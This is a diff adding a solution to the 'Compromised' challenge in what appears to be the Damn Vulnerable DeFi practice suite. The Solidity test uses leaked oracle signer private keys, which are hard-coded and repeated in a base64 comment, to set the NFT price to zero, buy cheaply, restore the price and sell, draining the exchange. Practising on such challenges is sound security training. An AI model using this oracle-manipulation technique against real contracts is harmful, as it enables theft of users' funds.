@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {ERC721ReceiverMock} from "./Compromised_exploiter.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -75,7 +76,40 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+       ERC721ReceiverMock receiver = new ERC721ReceiverMock();
+
+       (address player, uint256 playerPk) = makeAddrAndKey("player");
+
+       address signer1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+       address signer2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+       vm.signAndAttachDelegation(address(receiver), playerPk);
+
+       vm.startPrank(signer1);
+       oracle.postPrice(nft.symbol(), 0);
+       vm.stopPrank();
+
+       vm.startPrank(signer2);
+       oracle.postPrice(nft.symbol(), 0);
+       vm.stopPrank();
+
+       vm.startPrank(player);
+       uint256 tokenId = exchange.buyOne{value: 0.01 ether}();
+       vm.stopPrank();
+
+       vm.startPrank(signer1);
+       oracle.postPrice(nft.symbol(), INITIAL_NFT_PRICE);
+       vm.stopPrank();
+
+       vm.startPrank(signer2);
+       oracle.postPrice(nft.symbol(), INITIAL_NFT_PRICE);
+       vm.stopPrank();
+
+       vm.startPrank(player);
+       nft.approve(address(exchange), tokenId); 
+       exchange.sellOne(tokenId);
+       payable(recovery).transfer(INITIAL_NFT_PRICE);
+       vm.stopPrank();
     }
 
     /**
@@ -95,3 +129,8 @@ contract CompromisedChallenge is Test {
         assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
 }
+
+
+/**
+MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5
+ */
